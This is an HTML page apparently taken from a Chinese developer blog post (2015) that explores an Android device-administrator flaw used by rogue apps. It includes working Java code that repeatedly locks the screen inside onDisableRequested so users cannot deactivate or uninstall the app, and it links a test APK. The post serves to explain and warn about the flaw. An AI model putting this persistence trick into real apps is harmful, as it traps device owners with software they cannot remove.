@@ -1,0 +1,131 @@
+<html lang="zh" dir="ltr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:title" content="无法卸载的 App - 设备管理器漏洞" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://2bab.me/zh/blog/2015-02-09-app-cannot-be-uninstalled/" />
+  <link rel="stylesheet" href="/styles/main.css">
+  <link rel="me" href="https://2bab.me/">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.27.0/themes/prism.min.css">
+  
+  <title>无法卸载的 App - 设备管理器漏洞 | 2BAB&#39;s Blog</title>
+  
+</head>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NFRNXW3SHS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-NFRNXW3SHS');
+</script>
+
+<body>
+  
+<div>
+  <div class="container mx-auto prose py-12 sm:py-24 px-12 sm:px-0">
+    <div class="mb-12">
+      <a class="no-underline font-bold" href="/zh/">2BAB&#39;s Blog</a>
+    </div>
+    <h1>无法卸载的 App - 设备管理器漏洞</h1>
+    <div class="italic text-gray-500">
+      2015/02/09
+    </div>
+    <div>
+      <p>前两天某朋友发现手机有个app无法卸载，后知其因设备管理器激活导致，遂去尝试取消，但却在取消那刻卡机。反复折腾之后，只能重刷。后来他发了一篇关于设备管理器bug的文章给我，便有了如下一番折腾。</p>
+<p>##<strong>尝鲜</strong></p>
+<p>文章<a href="http://androidmaster.iteye.com/blog/2035381">《Android 学习 设备管理器勾选后不能再取消了》</a>（作者：带个回家）大致意思是：</p>
+<blockquote>
+<p>继承 DeviceAdminReceiver 重写 onDisableRequested(Context context, Intent intent) 即可达到目的。</p>
+</blockquote>
+<p>&lt;!-- more --&gt;</p>
+<pre class="language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><br><span class="token keyword">public</span> <span class="token class-name">CharSequence</span> <span class="token function">onDisableRequested</span><span class="token punctuation">(</span><span class="token class-name">Context</span> context<span class="token punctuation">,</span> <span class="token class-name">Intent</span> intent<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    <span class="token comment">// 这里处理 不可编辑设备。</span><br>    <span class="token class-name">Intent</span> intent2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token class-name">NoticeSetting</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    intent2<span class="token punctuation">.</span><span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">.</span><span class="token constant">FLAG_ACTIVITY_NEW_TASK</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    context<span class="token punctuation">.</span><span class="token function">startActivity</span><span class="token punctuation">(</span>intent2<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    context<span class="token punctuation">.</span><span class="token function">stopService</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 是否可以停止</span><br>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token comment">// "这是一个可选的消息，警告有关禁止用户的请求";</span><br>    <span class="token punctuation">}</span><br></code></pre>
+<p>在此之前，我并没有接触过设备管理器的功能，参考了 API Guides 的 <a href="http://developer.android.com/guide/topics/admin/device-admin.html">Device Administration</a> ，以及 <a href="http://developer.android.com/reference/android/app/admin/DeviceAdminReceiver.html">DeviceAdminReceiver</a> 的 API 后，试着写了一个跟上述文章一样的 app，<strong>4.4 &amp; 5.0均测试失败，可以正常取消激活</strong>。</p>
+<p>##<strong>再战</strong></p>
+<p>搜索，找到<a href="http://blog.csdn.net/androidsecurity/article/details/9124747">《Android设备管理器漏洞》</a>（作者：Jack_Jia）另一篇讲解此问题的文章。文章提到：</p>
+<blockquote>
+<p>如果想在设备管理器列表中”隐身“，只要不注册 <code>android.app.action.DEVICE_ADMIN_ENABLED</code> 广播就行。</p>
+</blockquote>
+<p>也就是不给 <code>intent-filter</code> 标签设置该 action。</p>
+<pre class="language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>receiver</span><br>    <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.MyDeviceReceiver<span class="token punctuation">"</span></span><br>    <span class="token attr-name"><span class="token namespace">android:</span>description</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@string/receiver_description<span class="token punctuation">"</span></span><br>    <span class="token attr-name"><span class="token namespace">android:</span>label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@string/app_name<span class="token punctuation">"</span></span><br>    <span class="token attr-name"><span class="token namespace">android:</span>permission</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.permission.BIND_DEVICE_ADMIN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br><br>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta-data</span><br>        <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.app.device_admin<span class="token punctuation">"</span></span><br>        <span class="token attr-name"><span class="token namespace">android:</span>resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@xml/device_manager_policies<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><br><br>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intent-filter</span><span class="token punctuation">></span></span><br>    <br>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intent-filter</span><span class="token punctuation">></span></span><br><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>receiver</span><span class="token punctuation">></span></span></code></pre>
+<p><strong>4.4 &amp; 5.0测试失败，设备管理器无法激活（代码激活不会弹出，设备管理器又找不到）。</strong></p>
+<p>##<strong>三战</strong></p>
+<p>继续搜索，发现百度安全实验室一篇文章<a href="http://safe.baidu.com/2014-10/deviceadminexploit2.html">《Android设备管理器漏洞2》</a>。文章提到：</p>
+<blockquote>
+<p>已激活设备管理器权限的手机木马利用该漏洞，可以在设置程序的设备管理器列表中隐藏，这样用户就无法通过正常途径取消该手机木马的设备管理器权限，从而达到无法卸载的目的。Android4.2版本以上系统已经修复该漏洞。</p>
+<p>...</p>
+<p>通过调用stopAppSwitch()方法，系统保证在进入取消设备管理器界面后，<strong>5秒内不会进行Activity的切换。</strong></p>
+<p>...</p>
+<p>onDisableRequested函数满足以下条件即可：</p>
+</blockquote>
+<p>1、返回内容不能为空，这样才可以使设备管理器弹出取消激活设备管理器警示信息 Dialog。</p>
+<blockquote></blockquote>
+<p>2、通过Activity切换的方式使设备管理器弹出的警示信息Dialog消失。使用户无法操作Dialog。
+如果做到以上两点，程序即可成功阻止用户取消激活设备管理器操作。</p>
+<p>故，只要在 onDisableRequested 方法中，让用户在取消激活时5s内无法操作界面，然后采取 Activity 切换的方法即可绕开取消激活的步骤。这里为了测试直观并且试一试设备管理器的 api，采用了百度提供的连续锁屏法。测试环境为5.0。</p>
+<pre class="language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">CharSequence</span> <span class="token function">onDisableRequested</span><span class="token punctuation">(</span><span class="token class-name">Context</span> context<span class="token punctuation">,</span> <span class="token class-name">Intent</span> intent<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            <br>                                                                                                                    <br>    <span class="token comment">//跳离当前询问是否取消激活的 dialog                                                                                          </span><br>    <span class="token class-name">Intent</span> outOfDialog <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getPackageManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLaunchIntentForPackage</span><span class="token punctuation">(</span><span class="token string">"com.android.settings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <br>    outOfDialog<span class="token punctuation">.</span><span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">.</span><span class="token constant">FLAG_ACTIVITY_NEW_TASK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                            <br>    context<span class="token punctuation">.</span><span class="token function">startActivity</span><span class="token punctuation">(</span>outOfDialog<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                             <br>                                                                                                                    <br>    <span class="token comment">//调用设备管理器本身的功能，每 100ms 锁屏一次，用户即便解锁也会立即被锁，直至 7s 后                                                                </span><br>    <span class="token keyword">final</span> <span class="token class-name">DevicePolicyManager</span> dpm <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">DevicePolicyManager</span><span class="token punctuation">)</span> context<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">DEVICE_POLICY_SERVICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <br>    dpm<span class="token punctuation">.</span><span class="token function">lockNow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                  <br>    <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                                     <br>        <span class="token annotation punctuation">@Override</span>                                                                                                   <br>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                                         <br>            <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                                                                                              <br>            <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">70</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                                        <br>                dpm<span class="token punctuation">.</span><span class="token function">lockNow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                      <br>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                                                                                               <br>                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                              <br>                    i<span class="token operator">++</span><span class="token punctuation">;</span>                                                                                            <br>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                  <br>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                            <br>                <span class="token punctuation">}</span>                                                                                                   <br>            <span class="token punctuation">}</span>                                                                                                       <br>        <span class="token punctuation">}</span>                                                                                                           <br>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                     <br>                                                                                                                    <br>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>                                                                                                      <br><span class="token punctuation">}</span>                                                                                                                   </code></pre>
+<ol>
+<li>
+<p>安装后打开直接跳转激活界面：
+<img src="http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-1.jpeg?imageslim" alt="安装后打开直接跳转激活界面"></p>
+</li>
+<li>
+<p>一旦激活则无法正常卸载
+<img src="http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-2.jpeg?imageslim" alt="一旦激活则无法正常卸载"></p>
+</li>
+<li>
+<p>进入设备管理器界面
+<img src="http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-3.jpeg?imageslim" alt="进入设备管理器界面"></p>
+</li>
+<li>
+<p>尝试取消激活
+<img src="http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-4.jpeg?imageslim" alt="尝试取消激活"></p>
+</li>
+<li>
+<p>强制进入锁屏
+<img src="http://2bab-images.lastmayday.com/blog/2015-02-09-app-cannot-be-uninstalled-5.jpeg?imageslim" alt="强制进入锁屏"></p>
+</li>
+</ol>
+<p>至此，用户用普通方法无法卸载该app。测试使用某数字软件可以卸载，具体步骤：在数字软件的软件卸载功能中卸载Trick，此时提示取消激活，跳转到设备管理器界面取消激活，引发锁屏，强制锁屏7s结束后，切回数字软件，你会发现出现了取消激活的dialog，点击取消成功。</p>
+<p>而文章开头提到的流氓软件，实则是跳转到一个所有按钮无效的自定义全屏界面（不是我这样跳到设置界面），使用数字软件无法解决问题。</p>
+<p>##<strong>总结</strong></p>
+<p>日后看到设备管理器激活申请定要小心三分，本文提及内容请勿不正当使用。</p>
+<p>##<strong>相关下载</strong></p>
+<ul>
+<li><a href="https://gist.github.com/2BAB/786513de79b7bfd82c3f">源码Gist</a></li>
+<li><a href="http://engineering-blog-2bab.qiniudn.com/DeviceAdmin-DeviceAdminTrick.apk">测试APK</a>，安装后激活则无法卸载。</li>
+<li><a href="http://engineering-blog-2bab.qiniudn.com/DeviceAdmin-recovery.apk">恢复APK</a>，覆盖安装后可顺利取消激活。</li>
+</ul>
+<p><em>欢迎关注我的<a href="/about">公众号和微博</a>。</em></p>
+
+    </div>
+    <hr />
+      <div class="text-sm text-center">
+        评论和交流请发送邮件到 xx2bab@gmail.com
+      </div>
+      <hr />
+     <div class="text-center">
+  <img class="w-64 inline-block" src="https://s2.loli.net/2023/05/13/FKYi5STEtmNZd8W.jpg" alt="Wechat Donate QACode" />
+  <div class="text-sm">
+    通过微信扫描赞赏码赞助此文
+  </div>
+</div> 
+    <footer class="text-sm py-12 text-gray-500 text-center">
+  
+  <p><a href="/en">ENG</a> / <a href="/zh">中文</a></p>
+  
+  2BAB's Blog since 2014
+</footer>
+  </div>
+
+</div>
+
+
+
+</body>
+</html>
